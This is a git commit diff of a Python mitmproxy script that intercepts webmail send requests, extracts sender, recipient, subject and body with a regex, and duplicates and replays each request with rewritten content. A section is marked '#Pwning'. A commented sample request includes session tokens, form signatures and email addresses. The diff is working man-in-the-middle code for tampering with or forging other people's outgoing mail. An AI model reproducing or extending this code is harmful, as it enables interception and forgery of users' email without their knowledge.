eeeb55bb8d041dbf1e4ddc3c87794168a1a5b7d6
thar0l <gusarov.aa@gmail.com>
2015-11-20 14:20:56 -0900

    Fixed mail script

--- mail_filter.py
+++ mail_filter.py
@@ -19,7 +19,9 @@ class Mail_data:
 
 #	m = re.match(r"(?P<Start>[\w\W]*)&To=(?P<To>[^&]*)&(?P<Middle>[\w\W]*)&Subject=(?P<Subject>[^&]*)&Body=(?P<Body>[^&]*)&(?P<End>[\w\W]*)&x-email=(?P<From>[^&]*)", string)
         m = re.match(r"(?P<Start>[\w\W]*)&x-email=(?P<From>[^&]*)&(?P<Middle>[\w\W]*)&To=(?P<To>[^&]*)&(?P<Middle2>[\w\W]*)&Subject=(?P<Subject>[^&]*)&Body=(?P<Body>[^&]*)&(?P<End>[\w\W]*)", string)
+        match = False
         if (m):
+            match = True
             self.mail.append(["mail","From: " + m.group('From'),"To: " + m.group('To'), "Subj: "+m.group('Subject'), m.group('Body')])
             logging.debug(str(self.mail[len(self.mail)-1]))
             #Pwning
@@ -28,7 +30,7 @@ class Mail_data:
 
 #            logging.debug("STR2")
 #            logging.debug(str(string2))
-            return str(string2)
+            return (match,str(string2))
             
 #old
 #message=P579I38l&old_charset=utf-8&template_id=&HTMLMessage=1&draft_msg=&re_msg=&fwd_msg=&text=&direction=re&orfo=rus&RealName=0&attached_ids=&files_ids=&To=%22gusarov.aa%22+%3Cgusarov.aa%40gmail.com%3E&CC=&BCC=&Priority=0&Subject=Test&Body=Testmessage%3Cbr%3E--+%3Cbr%3E%D0%90%D0%BB%D0%B5%D0%BA%D1%81%D0%B5%D0%B9+%D0%93%D1%83%D1%81%D0%B0%D1%80%D0%BE%D0%B2&security_image_word=&token=167699978529441869162194510557524567120%3A5347457f71610901190504000f0a080c050c06010c0d03040d000d0002000000040200090c0d060503030001020006071850405f674403&form_sign=245cb916210c3f0eed21a5f778a058da&form_token=5347457f71610901190606025a51080404060203560a5105505350030553045f07000958090d0954501646525b4559445e&x-email=_microsoft_%40list.ru
@@ -46,13 +48,14 @@ def request(context, flow):
     try:
         f = context.duplicate_flow(flow)
         with decoded(flow.request):  # automatically decode gzipped responses.
-            new_content = str(mail_db.get_email(str(flow.request.content)))
-        f.request.content = new_content
-        context.replay_request(f)        
+            replay, new_content = mail_db.get_email(str(flow.request.content))
+        if replay:
+            f.request.content = str(new_content)
+            context.replay_request(f)        
 
     except Exception as e:
-        logging.debug(e)
-
+#        logging.debug(e)
+        pass
 def start (context, argv):
     logging.basicConfig(filename="log.log",level=logging.DEBUG)
     logging.debug("============================================\n")
